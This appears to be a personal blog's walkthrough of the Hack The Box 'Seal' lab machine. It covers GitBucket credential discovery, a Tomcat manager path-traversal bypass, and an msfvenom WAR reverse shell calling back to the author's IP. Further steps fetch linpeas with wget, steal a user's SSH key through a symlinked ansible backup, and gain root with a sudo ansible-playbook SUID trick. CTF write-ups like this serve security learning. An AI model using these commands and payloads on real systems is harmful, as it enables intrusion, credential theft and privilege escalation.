---
title: "Seal"
author: "Me"
date: "November 13, 2021"
output: html_document
---

# Seal

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: medium (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_seal_desc.png){: height="415px" width = 625px"}
</div>

**Ports/services exploited:** 80/web application, TomCat, ssh\\
**Tools:** Burp, linpeas\\
**Techniques:** Directory Traversal\\
**Keywords:** Tomcat, ansible\\ 
**In a nutshell**: 

## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

Because it is a medium box, there will probably be more services than usual. Let's check it out with the usual *nmap* scan:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_seal_nmap.png)
</div>

We use the flags *-sV* to determine service/version info, *-sC* that is equivalent to *--script=default*, and *-O* to enable OS detection.\\
There aren't that many services running, however there is a ton of information for the web server on port 8080 and this is why I cut the output.
I always find it hard to start with this kind of result because there are so many information, and so many things to check for. In this case however, we'll start by browsing to the web server.

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

When browsing to *10.10.10.245:8080*, we land on the following page:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_seal_site.png)
</div>

We see it's GitBucket, a Git web platform very similar to Github. Since I don't have a GitBucket account, let's create one. Once this is done, we are automatically connected to the platform:

<div class="img_container">
![git]({{https://jsom1.github.io/}}/_images/htb_seal_git.png)
</div>

There are 2 repositories, *seal_market* and *infra*. We also see the user *root* as well as *luis*. By looking around on the site, we see something interesting:

<div class="img_container">
![info]({{https://jsom1.github.io/}}/_images/htb_seal_info.png)
</div>

First, we see it's an online shopping application. We also see a *tomcat* folder, indicating it's probably hosting the application.\\
I have already seen Tomcat but don't know it well, so here's what I found on Wiki:\\
*Apache Tomcat (called "Tomcat" for short) is a free and open-source implementation of the Jakarta Servlet (JSP), Jakarta Expression Language, and WebSocket technologies. 
Tomcat provides a "pure Java" HTTP web server environment in which Java code can run.*

Finally, there are some ToDo notes, among which one mentions a tomcat configuration file. It is always interesting to look at configuration files because they can show misconfigurations, credentials, and so on...\\
Let's then look if we can find this file. After a little bit of research, we see the following:

<div class="img_container">
![creds]({{https://jsom1.github.io/}}/_images/htb_seal_creds.png)
</div>

This is the updated file that was mentionned in the notes, and there are a username and a cleartext password to connect to tomcat. 
We must find where to use them. Nmap also showed a web server on port 443 (ssl), so maybe we will find it there. Let's browse to *https://10.10.10.250*:

<div class="img_container">
![ssl]({{https://jsom1.github.io/}}/_images/htb_seal_ssl.png)
</div>

This is the shopping web app. There isn't really any interesting information on the page, but there is a search field. We can check if the app is vulnerable to cross-site scripting (XSS) by inputting the following text:

````
<script>alert('xss')</script>
`````

We then refresh the page. The apparition of a popup would indicate that the application is vulnerable to stored XSS, which isn't the case here.
While we test the app further, we can start a *dirb* enumeration in the background:

<div class="img_container">
![dirb]({{https://jsom1.github.io/}}/_images/htb_seal_dirb.png)
</div>

We see the directories *manager* and *host-manager* that were mentionned in the ToDo notes. Unfortunately, we can't access any of those. Since we ran *dirb* with the *-r* flag (non recursive search), there might be subdirectories in those directories. Let's launch two other scans within them:

````
sudo dirb https://10.10.10.250/manager
sudo dirb https://10.10.10.250/host-manager
`````
There are indeed subdirectories (*/status*, */text*), and a connection window opens when we try to open *https://10.10.10.250/manager/status*:

<div class="img_container">
![connection]({{https://jsom1.github.io/}}/_images/htb_seal_co.png)
</div>

We can enter the credentials we discovered earlier. Note that I added *seal.htb* into my hosts file (*sudo echo "10.10.10.250 seal.htb" >> /etc/hosts*) because authentication didn't work with the IP for some reason.\\
We land on the Tomcat manager page:

<div class="img_container">
![manager]({{https://jsom1.github.io/}}/_images/htb_seal_manag.png)
</div>

We see the exact version of Tomcat, so let's see if there is an existing exploit for it:

````
searchsploit tomcat
`````

There are several exploits, but none for this version. We see however an excellent exploit (*tomcat_jsp_upload_bypass*) that I tried to use. I don't include the print screens here because it didn't work. By Googling something like "Tomcat exploit", we find many articles such as https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat, explaining how to exploit Tomcat. In this article, it is said that:

*If you have access to the Tomcat Web Application Manager, you can upload and deploy a .war file (execute code). Payload:\\
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war\\
Then, upload the revshell.war file and access to it (/revshell/)*

The problem is we have nothing to upload such a file. I had to look at the forum for help: apparently, the application is vulnerable to **Directory Traversal**, and we can access the page we want by browsing to *https://seal.htb/manager/jmxproxy/..;/hmtl*:

<div class="img_container">
![manager2]({{https://jsom1.github.io/}}/_images/htb_seal_manag2.png)
</div>

We now indeed see the possibility to upload files. Let's generate the payload as indicated in the article:

````
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f war -o revshell.war
`````

After uplloading it on the server and refreshing the page, we see it in the applications:

<div class="img_container">
![manager3]({{https://jsom1.github.io/}}/_images/htb_seal_manag3.png)
</div>

We set up a netcat listener on port 4444:

````
sudo nc -nlvp 4444
`````

And we click on our uploaded shell:

<div class="img_container">
![error]({{https://jsom1.github.io/}}/_images/htb_seal_error.png)
</div>

It doesn't work. We see in the URL where it tried to upload it: */manager/html/upload*. However, we don't have access to that directory. Let's set up Burp as a Proxy and intercept the request. We see the POST request to */manager/html/upload*, and we will change it as follows:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_seal_burp.png)
</div>

Then, we forward the request and look if our listener caught the connection:

<div class="img_container">
![revsh]({{https://jsom1.github.io/}}/_images/htb_seal_revsh.png)
</div>

It did, and we're in as *tomcat*! This user very likely has limited privileges... We can still access luis' desktop, but we get a *permission denied* error when we try to *cat* the user flag. That's a shame, and it's time for privesc!

## 3. Privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

After looking around manually, I uploaded *linpeas* on the target. To do so, we start a web server on our machine (in the same directory where linpeas is):

````
sudo python3 -m http.server 80
`````

and we download the file from our limited user shell:

````
wget http://10.10.14.4/linpeas.sh
`````

Finally, we launch the script (it didn't work at first because I think I wasn't in the good directory. It worked after changing to *tmp*):

````
./linpeas.sh
````

As usual, the output is huge but the interesting lines are the following:

<div class="img_container">
![linpeas]({{https://jsom1.github.io/}}/_images/htb_seal_lp.png)
</div>

A *run.yml* file is mentionned. It's not on the image above, but this file is also executed in a cronjob. Let's look at that latter:

````
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
``````
We see 3 tasks: one to copy files, one to do backups, and the last one to clean. The one that copies files take them from */var/lib/tomcat9/webapp/ROOT/admin/dashboard* and copies them to */opt/backups/files*. I once again had to look at the forums for a hint. What should stand out here is **copy_links=yes**, which means that symbolic links are allowed. I vaguely know what it is, so let's look for more information: *A symbolic link, also known as a symlink or soft link, is a special type of file that points to another file or directory.*. Apparently, we can create a symbolic link to pull luis' .ssh directory.

We can have a look at the copy source to see what's there:

<div class="img_container">
![copy]({{https://jsom1.github.io/}}/_images/htb_seal_copy.png)
</div>

We see the directory uploads has read, write and execute permissions for anyone. We can then copy luis' .ssh directory by creating a symbolic link as follows:

````
ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
`````

*ln* is a command-line utility for creating links between files. By default, the *ln* command creates hard links. To create a symbolic link, use the *-s* (--symbolic) option.

We see the file was copied in */backups*. I created a *.tmp* directory into */tmp* where I copied the output:

````
cp /opt/backups/archives/backup-2021-11-13-11:05:32.gz /tmp/.tmp
````

I then had to rename the file (otherwise the unzipping didn't work) and finally extract its content:

````
mv backup-2021-11-13-11:05:32.gz backup.gz
tar -xf backup.gz
`````

This copied the info into the folder:

<div class="img_container">
![idrsa]({{https://jsom1.github.io/}}/_images/htb_seal_idrsa.png)
</div>

Finally, we can *cat* id_rsa, copy its content (including "-----BEGIN OPENSSH PRIVATE KEY-----" at the beginning and "-----END OPENSSH PRIVATE KEY-----" at the end of it) and paste it in a file on our kali machine (*sudo nano id_rsa* and paste it inside).\\
We should now be able to SSH as luis:

<div class="img_container">
![ssh]({{https://jsom1.github.io/}}/_images/htb_seal_ssh.png)
</div>

It worked, and we can grab the user flag!

We once again want to elevate our privileges. As usual, let's have a look at what luis can do:

<div class="img_container">
![sudol]({{https://jsom1.github.io/}}/_images/htb_seal_sudol.png)
</div>

We see it can run *ansible-playbook* as root without providing a password. A little bit of Googling shows interesting articles, among which https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html. We learn we can write a *.yml* file to exploit this "misconfiguration":

`````
- name: Check the remote host uptime
  hosts: localhost
  tasks:
    - name: Execute the uptime command over Command module
      command: "chmod +s /bin/bash"
`````
We use *ansible-playbook* to run our file

<div class="img_container">
![root]({{https://jsom1.github.io/}}/_images/htb_seal_root.png)
</div>

And we're root!

<div class="img_container">
![pwn]({{https://jsom1.github.io/}}/_images/htb_seal_pwn.png)
</div>


<ins>**My thoughts**</ins>
not enough time. First time 2 privesc.

<ins>**Fix the vulnerabilities**</ins>

